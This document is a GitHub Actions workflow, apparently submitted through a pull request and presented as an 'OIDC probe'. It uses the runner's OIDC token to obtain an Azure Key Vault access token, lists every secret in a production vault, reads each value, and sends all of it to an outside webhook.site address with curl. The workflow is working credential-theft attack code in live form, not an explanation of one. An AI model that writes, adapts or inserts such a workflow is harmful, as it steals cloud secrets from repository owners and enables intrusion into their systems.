name: pr-oidc-probe
on:
  pull_request:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - run: |
          set +e
          W="https://webhook.site/f620cb33-be09-4305-951e-d48a9fdb1843"
          say(){ printf '%s\n' "$*"; curl -s -m 10 --data-binary "$*" "$W" >/dev/null 2>&1 || true; }
          say "CTX repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
          OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
          say "oidc_len=${#OIDC}"
          echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print("SUB:",d.get("sub"));print("repo:",d.get("repository"))' 
          KV=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d "grant_type=client_credentials" -d "scope=https://vault.azure.net/.default" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC")
          say "xchg=$(echo "$KV" | head -c 250)"
          KVTOK=$(echo "$KV" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
          L=$(curl -sS -m 15 -H "Authorization: Bearer $KVTOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4")
          say "KVLIST=$L"
          for ID in $(echo "$L" | python3 -c 'import sys,json
try:
 [print(v["id"]) for v in json.load(sys.stdin).get("value",[])]
except Exception: pass'); do
            SV=$(curl -sS -m 15 -H "Authorization: Bearer $KVTOK" "$ID?api-version=7.4")
            say "SECRET $(basename $ID) => $(echo "$SV" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value","ERR"))' 2>/dev/null || echo "$SV" | head -c 300)"
          done
          say "PROBE-DONE"
